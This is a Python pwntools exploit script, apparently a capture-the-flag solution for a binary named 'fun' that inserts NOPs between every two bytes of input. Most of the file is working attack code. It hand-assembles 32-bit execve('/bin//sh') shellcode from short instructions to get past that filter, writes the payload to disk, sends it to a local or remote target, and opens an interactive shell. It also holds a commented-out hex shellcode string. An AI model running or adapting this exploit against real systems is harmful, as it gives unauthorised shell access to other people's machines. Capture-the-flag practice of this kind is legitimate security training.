from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './fun'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# The program inserts nops every two bytes, which means the opcodes needs to be two bytes or less
bin_sh = """
    
    xor ebx, ebx
    mov bl, 0x68
    mov cl, 8
    shl ebx, cl
    mov bl, 0x73
    shl ebx, cl
    mov bl, 0x2f
    shl ebx, cl
    mov bl, 0x2f
    push ebx

    xor ebx, ebx
    mov bl, 0x6e
    shl ebx, cl
    mov bl, 0x69
    shl ebx, cl
    mov bl, 0x62
    shl ebx, cl
    mov bl, 0x2f
    push ebx
    """

argv_push = """
    xor ecx, ecx
    """

last = """
    xor eax, eax
    xor edx, edx
    mov al, 11
    int 0x80
    """

x_bin_sh = asm(bin_sh)
x_argv = asm(argv_push)
x_last = asm(last)

# fmt_sh = "".join([f'\\x{byte:02x}' for byte in asm(shellcode)])
print(len(x_bin_sh))
print(len(x_argv))
print(len(x_last))
payload = x_bin_sh+x_argv+x_last
# payload = bytes.fromhex(
#    "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80")

open("payload", "wb").write(payload)
io = start()

io.sendlineafter(b'', payload)

io.interactive()
